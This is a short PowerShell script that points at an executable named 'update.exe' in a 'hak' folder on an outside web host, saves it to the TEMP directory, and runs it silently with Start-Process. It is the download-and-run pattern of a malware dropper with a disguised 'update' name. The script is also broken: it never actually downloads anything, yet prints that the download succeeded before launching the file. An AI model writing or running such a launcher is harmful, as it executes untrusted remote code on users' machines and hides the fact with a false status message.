$url = "http://thejohnsons.net.nz/source/hak/update.exe"
$outputPath = "$env:TEMP\update.exe"  # This saves the file to the temporary directory

try {
    Write-Output "File downloaded successfully to $outputPath"
    Start-Process -FilePath $outputPath -NoNewWindow -Wait
}
catch {
    Write-Output "An error occurred: $_"
}
